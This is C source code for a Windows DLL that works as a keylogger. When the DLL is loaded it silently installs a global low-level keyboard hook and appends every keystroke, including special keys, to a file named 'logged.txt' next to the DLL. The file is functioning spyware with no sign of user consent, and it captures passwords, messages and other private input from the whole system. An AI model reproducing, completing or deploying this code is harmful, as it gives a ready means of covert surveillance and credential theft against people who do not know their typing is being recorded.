#include <windows.h>
#include <stdio.h>

static HHOOK hKeyboardHook = NULL;
static HANDLE hLogFile = INVALID_HANDLE_VALUE;
static HANDLE hThread = NULL;
static HINSTANCE hModule = NULL;
static DWORD dwThreadId = 0;

static void GetDllDir(char *path, DWORD size) {
    GetModuleFileNameA(hModule, path, size);
    char *lastSlash = strrchr(path, '\\');
    if (lastSlash) *(lastSlash + 1) = '\0';
}

static void WriteLog(const char *text) {
    if (hLogFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hLogFile, text, (DWORD)strlen(text), &written, NULL);
        FlushFileBuffers(hLogFile);
    }
}

static const char *GetSpecialKeyName(DWORD vkCode) {
    switch (vkCode) {
        case VK_BACK:     return "[BACKSPACE]";
        case VK_TAB:      return "[TAB]";
        case VK_RETURN:   return "\r\n";
        case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT:       return "";
        case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: return "";
        case VK_MENU: case VK_LMENU: case VK_RMENU:          return "";
        case VK_ESCAPE:   return "[ESC]";
        case VK_SPACE:    return " ";
        case VK_DELETE:   return "[DEL]";
        case VK_LEFT:     return "[LEFT]";
        case VK_RIGHT:    return "[RIGHT]";
        case VK_UP:       return "[UP]";
        case VK_DOWN:     return "[DOWN]";
        case VK_CAPITAL:  return "[CAPSLOCK]";
        case VK_HOME:     return "[HOME]";
        case VK_END:      return "[END]";
        case VK_PRIOR:    return "[PGUP]";
        case VK_NEXT:     return "[PGDN]";
        case VK_INSERT:   return "[INS]";
        case VK_F1:  return "[F1]";  case VK_F2:  return "[F2]";
        case VK_F3:  return "[F3]";  case VK_F4:  return "[F4]";
        case VK_F5:  return "[F5]";  case VK_F6:  return "[F6]";
        case VK_F7:  return "[F7]";  case VK_F8:  return "[F8]";
        case VK_F9:  return "[F9]";  case VK_F10: return "[F10]";
        case VK_F11: return "[F11]"; case VK_F12: return "[F12]";
        default: return NULL;
    }
}

static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;

        const char *special = GetSpecialKeyName(kb->vkCode);
        if (special) {
            if (special[0] != '\0')
                WriteLog(special);
        } else {
            BYTE keyState[256];
            GetKeyboardState(keyState);

            WCHAR wBuf[4] = {0};
            UINT scanCode = MapVirtualKeyW(kb->vkCode, MAPVK_VK_TO_VSC);
            int res = ToUnicode(kb->vkCode, scanCode, keyState, wBuf, 4, 0);

            if (res > 0) {
                char utf8[8] = {0};
                WideCharToMultiByte(CP_UTF8, 0, wBuf, res, utf8, sizeof(utf8), NULL, NULL);
                WriteLog(utf8);
            }
        }
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

static DWORD WINAPI HookThread(LPVOID lpParam) {
    hKeyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, hModule, 0);
    if (!hKeyboardHook) return 1;

    /* Low-level hooks require a message loop on the hooking thread */
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hKeyboardHook);
    hKeyboardHook = NULL;
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hDll, DWORD reason, LPVOID reserved) {
    switch (reason) {
        case DLL_PROCESS_ATTACH:
            hModule = hDll;
            DisableThreadLibraryCalls(hDll);

            /* Open logged.txt next to the DLL (append mode) */
            {
                char logPath[MAX_PATH];
                GetDllDir(logPath, MAX_PATH);
                strcat(logPath, "logged.txt");

                hLogFile = CreateFileA(
                    logPath, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
                    NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            }

            /* Spin up the hook thread */
            hThread = CreateThread(NULL, 0, HookThread, NULL, 0, &dwThreadId);
            break;

        case DLL_PROCESS_DETACH:
            if (dwThreadId)
                PostThreadMessage(dwThreadId, WM_QUIT, 0, 0);
            if (hThread) {
                WaitForSingleObject(hThread, 2000);
                CloseHandle(hThread);
            }
            if (hLogFile != INVALID_HANDLE_VALUE)
                CloseHandle(hLogFile);
            break;
    }
    return TRUE;
}